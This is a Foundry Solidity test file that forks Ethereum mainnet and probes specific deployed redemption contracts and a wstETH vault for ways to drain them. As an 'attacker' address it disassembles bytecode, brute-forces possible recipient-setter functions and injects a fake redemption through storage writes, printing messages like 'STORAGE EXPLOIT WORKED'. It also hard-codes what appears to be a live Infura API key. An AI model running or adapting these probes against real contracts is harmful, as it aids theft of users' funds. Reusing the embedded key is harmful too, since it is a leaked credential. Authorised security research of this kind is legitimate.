// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract FinalizeRedeemAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant OWNER = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeFinalizeRedeemBytecode() public view {
        console.log("=== ANALYZING FINALIZEREDEEM BYTECODE ===\n");

        bytes memory code = REDEMPTION_0.code;

        // finalizeRedeem(uint256) = 0xaff6cbf1
        // Find where it jumps to
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == bytes4(0xaff6cbf1)) {
                    console.log("Found finalizeRedeem selector at:", i);

                    // Find the jump destination
                    for (uint j = i + 5; j < i + 30 && j + 3 < code.length; j++) {
                        if (uint8(code[j]) == 0x61) { // PUSH2
                            uint16 dest = uint16(uint8(code[j+1])) << 8 | uint16(uint8(code[j+2]));
                            console.log("  Jumps to:", dest);

                            // Analyze what's at that destination
                            console.log("\n  Bytecode at destination:");
                            for (uint k = dest; k < dest + 100 && k < code.length; k++) {
                                uint8 op = uint8(code[k]);
                                if (op == 0x54) console.log("    ", k, "SLOAD");
                                else if (op == 0x35) console.log("    ", k, "CALLDATALOAD");
                                else if (op == 0xf1) console.log("    ", k, "CALL");
                                else if (op == 0xf4) console.log("    ", k, "DELEGATECALL");
                                else if (op == 0x20) console.log("    ", k, "SHA3/KECCAK");
                            }
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }

    function test_CreateAndFinalizeAsOwner() public {
        console.log("=== CREATING AND FINALIZING REDEMPTION AS OWNER ===\n");

        // The owner might be able to create and finalize redemptions
        // with arbitrary recipients

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(IAU, OWNER, 100000e18);

        vm.startPrank(OWNER);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // First try to create a redemption as owner
        console.log("\nTrying to redeem as owner...");
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(d1));
        }

        // Warp time
        vm.warp(block.timestamp + 8 days);

        // Try finalizeRedeem
        console.log("\nTrying finalizeRedeem(0)...");
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem success:", s2);
        if (!s2 && d2.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault wstETH after:", vaultAfter / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("*** OWNER CAN DRAIN! ***");
            console.log("Owner wstETH:", IERC20(wstETH).balanceOf(OWNER) / 1e18);
        }
    }

    function test_CheckRedemptionByIndex() public view {
        console.log("=== CHECKING REDEMPTIONS BY INDEX ===\n");

        // Try to find a function that returns redemption data
        // This will help us understand the struct

        // Try selector 0xb2118a8d which might be a getter
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d), OWNER, uint256(0))
        );
        if (s1 && d1.length >= 32) {
            console.log("0xb2118a8d returned data of length:", d1.length);
            // Try to decode as (uint256, uint256, address) or similar
            if (d1.length >= 96) {
                (uint256 a, uint256 b, address c) = abi.decode(d1, (uint256, uint256, address));
                console.log("  Value 1:", a);
                console.log("  Value 2:", b);
                console.log("  Address:", c);
            } else if (d1.length >= 64) {
                (uint256 a, uint256 b) = abi.decode(d1, (uint256, uint256));
                console.log("  Value 1:", a);
                console.log("  Value 2:", b);
            }
        }

        // Try 0x900fd1ed
        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x900fd1ed), OWNER)
        );
        if (s2 && d2.length >= 32) {
            console.log("\n0x900fd1ed returned:", uint256(bytes32(d2)));
        }

        // Try 0xa82b69ff
        (bool s3, bytes memory d3) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xa82b69ff))
        );
        if (s3 && d3.length >= 32) {
            console.log("\n0xa82b69ff returned:", uint256(bytes32(d3)));
        }
    }

    function test_FindActualRedemptionData() public view {
        console.log("=== FINDING ACTUAL REDEMPTION DATA ===\n");

        // Look for users who have created redemptions
        // by scanning storage

        // Check if OWNER has any redemptions
        console.log("Checking OWNER's redemption data:");

        // Try different base slots for mapping(address => RedemptionRequest[])
        for (uint base = 5; base < 20; base++) {
            bytes32 arrayLenSlot = keccak256(abi.encode(OWNER, base));
            bytes32 arrayLen = vm.load(REDEMPTION_0, arrayLenSlot);

            if (arrayLen != bytes32(0) && uint256(arrayLen) < 1000) {
                console.log("\nFound array at base slot:", base);
                console.log("  Length:", uint256(arrayLen));

                // Get array data
                bytes32 dataStart = keccak256(abi.encode(arrayLenSlot));

                for (uint elem = 0; elem < 3 && elem < uint256(arrayLen); elem++) {
                    console.log("\n  Element", elem, ":");
                    for (uint offset = 0; offset < 4; offset++) {
                        bytes32 dataSlot = bytes32(uint256(dataStart) + elem * 4 + offset);
                        bytes32 data = vm.load(REDEMPTION_0, dataSlot);
                        if (data != bytes32(0)) {
                            console.log("    Offset", offset, ":");
                            console.logBytes32(data);
                        }
                    }
                }
            }
        }
    }

    function test_InvestigateRC_redeemParams() public view {
        console.log("=== INVESTIGATING RC.redeem PARAMETERS ===\n");

        // RC.redeem(uint256 amount, address to)
        // The key question is: where does 'to' come from?

        // In finalizeRedeem:
        // - 'to' might be msg.sender (the caller)
        // - 'to' might be stored in the redemption request
        // - 'to' might be a hardcoded treasury address

        // Let's check the RC contract to see what it does
        bytes memory rcCode = REDEMPTION_CONTROLLER.code;
        console.log("RC code size:", rcCode.length);

        // Find all CALLs in RC
        uint callCount = 0;
        for (uint i = 0; i < rcCode.length; i++) {
            if (uint8(rcCode[i]) == 0xf1) callCount++;
        }
        console.log("RC has", callCount, "CALL opcodes");

        // Check if RC has any DELEGATECALLs
        uint dcCount = 0;
        for (uint i = 0; i < rcCode.length; i++) {
            if (uint8(rcCode[i]) == 0xf4) dcCount++;
        }
        console.log("RC has", dcCount, "DELEGATECALL opcodes");
    }

    function test_TrySettingRecipient() public {
        console.log("=== TRYING TO SET RECIPIENT ===\n");

        // Maybe there's a function to set the redemption recipient
        // that we can call as attacker

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try functions that might set recipient
        bytes4[] memory selectors = new bytes4[](10);
        selectors[0] = bytes4(keccak256("setRecipient(address)"));
        selectors[1] = bytes4(keccak256("setTo(address)"));
        selectors[2] = bytes4(keccak256("setDestination(address)"));
        selectors[3] = bytes4(keccak256("updateRecipient(address)"));
        selectors[4] = bytes4(keccak256("changeRecipient(address)"));
        selectors[5] = bytes4(keccak256("setReceiver(address)"));
        selectors[6] = bytes4(keccak256("setBeneficiary(address)"));
        selectors[7] = bytes4(keccak256("redeemTo(uint96,address)"));
        selectors[8] = bytes4(keccak256("redeemFor(uint96,address)"));
        selectors[9] = bytes4(keccak256("redeemWithRecipient(uint96,address)"));

        console.log("Trying recipient setters on REDEMPTION_0:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = REDEMPTION_0.call(
                abi.encodeWithSelector(selectors[i], attacker)
            );
            if (success) {
                console.log("SUCCESS:");
                console.logBytes4(selectors[i]);
            }
        }

        console.log("\nTrying on REDEMPTION_1:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = REDEMPTION_1.call(
                abi.encodeWithSelector(selectors[i], attacker)
            );
            if (success) {
                console.log("SUCCESS:");
                console.logBytes4(selectors[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** FOUND RECIPIENT SETTER! ***");
        }
    }

    function test_SimulateStorageExploit() public {
        console.log("=== SIMULATING STORAGE EXPLOIT ===\n");

        // What if we can manipulate the storage to create a fake redemption
        // with attacker as recipient?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // First, find the correct storage layout
        // Then use vm.store to inject a fake redemption

        // Based on slot 4 packed data:
        // 0x00000005 000000350e9ec117defc5dc0 00093a80 0000000ad78ebc5ac6200000
        // This might be: epoch | cap | redeemed | total

        // Let's try to create a fake redemption at the correct slot
        // Assuming mapping(address => RedemptionRequest[]) at slot 5

        // Set array length
        bytes32 arraySlot = keccak256(abi.encode(attacker, uint256(5)));
        vm.store(REDEMPTION_0, arraySlot, bytes32(uint256(1)));

        // Set array element (assuming 2 slots per element)
        bytes32 dataStart = keccak256(abi.encode(arraySlot));

        // Element 0, Slot 0: amount and timestamp packed
        // amount = 1000e18 = 0xd3c21bcecceda1000000
        // startTime = block.timestamp - 8 days
        uint96 amount = uint96(1000e18);
        uint64 startTime = uint64(block.timestamp - 8 days);

        bytes32 packed1 = bytes32((uint256(startTime) << 96) | uint256(amount));
        vm.store(REDEMPTION_0, dataStart, packed1);

        // Element 0, Slot 1: recipient address (attacker)
        vm.store(REDEMPTION_0, bytes32(uint256(dataStart) + 1), bytes32(uint256(uint160(attacker))));

        console.log("Fake redemption created in storage");
        console.log("  Amount:", uint256(amount) / 1e18);
        console.log("  StartTime:", startTime);
        console.log("  Recipient:", attacker);

        // Now try to finalize
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 1); // Ensure time is after storage manipulation

        console.log("\nTrying finalizeRedeem(0)...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerAfter / 1e18);

        if (attackerAfter > 0) {
            console.log("\n*** STORAGE EXPLOIT WORKED! ***");
        }
    }
}
